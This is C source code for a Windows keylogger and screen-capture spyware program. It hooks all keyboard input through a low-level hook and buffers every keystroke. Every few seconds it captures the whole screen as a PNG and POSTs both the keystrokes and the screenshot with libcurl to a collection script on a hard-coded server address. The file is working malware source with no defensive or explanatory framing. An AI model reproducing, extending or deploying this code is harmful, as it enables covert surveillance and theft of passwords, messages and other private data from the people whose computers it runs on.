#include <stdio.h>
#include <time.h>
#include "curl/curl.h"
#include "lodepng.h"

#define BUFFERLEN 1024
char *buffer;
unsigned int bufferIndex = 0;
unsigned int bufferSize = BUFFERLEN;
HANDLE mutex;

BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
{
    BOOL Success=FALSE;
    HDC SurfDC=NULL;        // GDI-compatible device context for the surface
    HBITMAP OffscrBmp=NULL; // bitmap that is converted to a DIB
    HDC OffscrDC=NULL;      // offscreen DC that we can select OffscrBmp into
    LPBITMAPINFO lpbi=NULL; // bitmap format info; used by GetDIBits
    LPVOID lpvBits=NULL;    // pointer to bitmap bits array
    HANDLE BmpFile=INVALID_HANDLE_VALUE;    // destination .bmp file
    BITMAPFILEHEADER bmfh;  // .bmp file header

    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return FALSE;

    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
        return FALSE;

    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
	lpbi = (LPBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD));

    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

    SelectObject(OffscrDC, OldBmp);
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
        return FALSE;

    lpvBits = malloc(lpbi->bmiHeader.biSizeImage);

    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
        return FALSE;

	int h = height;
    int w = width;
    unsigned scanlineBytes = w * 4;
	if(scanlineBytes % 4 != 0) scanlineBytes = (scanlineBytes / 4) * 4 + 4;

	char *png = malloc(w * h * 4);
	int x,y;
	
	for(y = 0; y < h; y++)
	for(x = 0; x < w; x++)
	{
    	unsigned bmpos = (h - y - 1) * scanlineBytes + 4 * x;
    	unsigned newpos = 4 * y * w + 4 * x;

    	png[newpos + 0] = ((char *)lpvBits)[bmpos + 2]; //R
		png[newpos + 1] = ((char *)lpvBits)[bmpos + 1]; //G
		png[newpos + 2] = ((char *)lpvBits)[bmpos + 0]; //B
		png[newpos + 3] = 255;            //A
	}
	  
    lodepng_encode32_file(filename, png, width, height);
	CloseHandle(BmpFile);
	free(lpvBits);
    return TRUE;
}

BOOL ScreenCapture(char *filename)
{	
	HDC hDc = CreateCompatibleDC(0);
	int width = GetDeviceCaps(hDc, HORZRES);
	int height = GetDeviceCaps(hDc, VERTRES);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	BOOL ret = SaveBMPFile(filename, hBmp, hDc, width, height);
	DeleteObject(hBmp);
	DeleteObject(hDc);
	return ret;
}



int FileSend(char *data, int length)
{
	FILE *log;
	log = fopen("log","a+");
	fprintf(log, "%*s", length, data);
	fclose(log);
	
	return 1;
}

int CurlSend(char *data, int length, char *postParamName)
{
	CURL *curl;
	CURLcode res;
	
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	res = CURLE_OK;
	
	if(curl)
	{
		char *inputStr = postParamName;
		char *httpStr = curl_easy_escape(curl, data, length);
		
		char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
		strcpy(sendStr, inputStr);
		strcat(sendStr, httpStr);
		
		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		
		curl_free(httpStr);
		free(sendStr);
	}
	
	curl_global_cleanup();
	
	if(res == CURLE_OK)
	{
		return 1;
	}
	
	return 0;	
}

void ConvertKey(unsigned int key, char *outStr)
{
	BYTE keyboardState[256];
	WORD out;
	GetKeyboardState(keyboardState);
	int res = ToAsciiEx(key, MapVirtualKeyEx(key, 0, GetKeyboardLayout(0)), keyboardState, &out, 0, GetKeyboardLayout(0)); 

	if(res == 1)
	{
		outStr[0] = out & 0xff;
		outStr[1] = 0;
	}
	if(res == 2)
	{
		outStr[0] = out & 0xff;
		outStr[1] = (out >> 8) & 0xff;
		outStr[2] = 0;
	}
}

void SaveKey(unsigned int key)
{
	char keyStr[16];
	ConvertKey(key, keyStr);
	
	// lock
	WaitForSingleObject(mutex, INFINITE);
	
	int len = strlen(buffer);
	int available = bufferSize - len;
	
	if (strlen(keyStr) >= available)
	{
		bufferSize *= 2; // raddoppio la grandezza del buffer
		buffer = realloc(buffer, bufferSize);
	}
	
	strcat(buffer, keyStr);
	
	// unlock
	ReleaseMutex(mutex);
}

LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;

	if (wParam == WM_KEYDOWN)
	{
		SaveKey(keyboard->vkCode);
	}
	
	return 0;
}

DWORD WINAPI KeyLogger()
{
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
	MSG msg;
	
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	return 0;
}

void SendScreenshot()
{
	ScreenCapture("data");
	
	FILE *img = fopen("data", "rb");
	
	if(img > 0)
	{
		fseek(img, 0, SEEK_END);
		long len = ftell(img);
		fseek(img, 0, SEEK_SET);
		
		if(len > 0)
		{
			char *image = (char *)malloc(len);
			fread(image, 1, len, img);
			CurlSend(image, len, "image=");
			free(image);
		}
		fclose(img);
	}
}

int main(void)
{			
	mutex = CreateMutex(NULL, FALSE, NULL);
	
	buffer = (char*)malloc(BUFFERLEN);
	buffer[0] = 0;
	
	HANDLE logger;
	logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
	
	int timer = 0;
	int len;
	
	while(1)
	{
		if(timer > 10)
		{	
			SendScreenshot();
			
			// lock
			WaitForSingleObject(mutex, INFINITE);
			
			len = strlen(buffer);
			
			// unlock
			ReleaseMutex(mutex);
			
			int res = CurlSend(buffer, len, "text=");
			if(res)
			{
				// lock
				WaitForSingleObject(mutex, INFINITE);
				
				// reset buffer
				strcpy(buffer, buffer + len);
				
				// unlock
				ReleaseMutex(mutex);
			}
			
			timer = 0;
		}
		timer++;
		Sleep(1000); // 1 sec sleep
	}
	
	return 0;
}
